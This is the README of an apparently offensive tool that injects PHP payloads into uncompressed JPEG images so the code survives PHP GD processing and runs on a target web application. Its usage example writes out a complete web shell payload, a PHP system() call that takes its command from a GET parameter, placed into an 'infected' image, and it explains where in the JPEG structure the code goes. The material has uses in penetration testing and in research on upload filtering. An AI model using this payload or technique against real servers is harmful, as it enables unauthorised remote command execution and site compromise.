# php-jpeg-injector
Injects php payloads into jpeg images. Related to [this post](https://github.com/fakhrizulkifli/Defeating-PHP-GD-imagecreatefromjpeg).

# Use Case
You have a web application that runs a jpeg image through PHP's GD graphics library.

# Description
This script injects PHP code into a specified jpeg image. The web application will execute the payload if it interprets the image. Make sure your input jpeg is uncompressed!

# Usage
`python3 gd-jpeg.py [JPEG] [PAYLOAD] [OUTPUT_JPEG]`

e.g. `python3 gd-jpeg.py cat.jpeg '<?php system($_GET["cmd"]);?>' infected_cat.jpeg`

# How it works
PHP code is injected in the null/garbage (brown) space after the scan header:

![header](https://camo.githubusercontent.com/0caae5a119b1d4c0bb4aed9504ce5086301cd100/687474703a2f2f692e696d6775722e636f6d2f696c35666841612e6a7067 "scan header")

The new infected jpeg is run through PHP's gd-library. PHP interprets the payload injected in the jpeg and executes it.
